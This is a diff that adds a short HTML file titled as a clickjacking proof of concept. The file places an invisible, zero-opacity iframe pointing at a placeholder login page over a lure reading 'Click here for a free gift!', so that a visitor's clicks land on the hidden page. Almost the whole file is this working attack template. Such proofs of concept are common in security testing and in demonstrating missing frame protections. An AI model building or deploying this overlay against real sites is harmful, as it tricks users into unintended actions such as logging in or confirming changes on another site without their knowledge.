@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Proof of Concept</title>
+    <style>
+        /* Style the invisible iframe and visible content */
+        #clickjacking {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 500px;
+            height: 500px;
+            opacity: 0;
+            z-index: 2;
+            border: none; /* Remove iframe border */
+        }
+
+        #content {
+            position: relative;
+            width: 500px;
+            height: 500px;
+            z-index: 1;
+            background-color: #f9f9f9;
+            border: 1px solid #ccc;
+            padding: 20px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div id="content">
+        <!-- Visible content to lure the user into clicking -->
+        <h1>Click here for a free gift!</h1>
+        <button>Click me!</button>
+    </div>
+    <!-- Invisible iframe overlay for the clickjacking attack -->
+    <iframe id="clickjacking" src="http://exampleURLhere.com/login-page"></iframe>
+</body>
+</html>
